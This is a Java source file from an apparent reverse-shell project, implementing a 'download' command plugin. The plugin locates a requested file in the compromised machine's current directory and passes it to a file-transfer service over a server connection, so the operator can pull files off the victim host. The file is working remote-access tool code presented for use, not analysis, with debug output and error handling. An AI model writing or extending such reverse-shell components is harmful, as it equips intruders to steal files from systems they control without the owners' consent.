package obs1d1anc1ph3r.reverseshell.plugins;

import java.io.File;
import obs1d1anc1ph3r.reverseshell.ServerConnection;
import obs1d1anc1ph3r.reverseshell.utils.FileTransferService;

public class DownloadCommand implements CommandPlugin {
    
    private static String currentDir = System.getProperty("user.dir");
    private ServerConnection serverConnection;
    
    @Override
    public String getCommandName() {
        return "download";
    }
    
    @Override
    public String execute(String[] args) {
        if (args.length == 0) {
            return "Error: No file specified for download.";
        }
        
        currentDir = CDCommand.getCurrentDirectory();
        String filePath = args[0];
        File file = new File(currentDir, filePath);
        System.out.println("[DEBUG] Attempting to download file: " + file.getAbsolutePath());
        
        if (!file.exists() || !file.isFile()) {
            return "Error: File not found at " + file.getAbsolutePath();
        }
        
        try {
            FileTransferService fileTransferService = new FileTransferService();
            fileTransferService.handleDownload(filePath, currentDir, serverConnection);
            return "File downloaded successfully.";
        } catch (Exception e) {
            return "Error: Unable to read file: " + e.getMessage();
        }
    }
    
    public void setServerConnection(ServerConnection serverConnection) {
        this.serverConnection = serverConnection;
    }
}
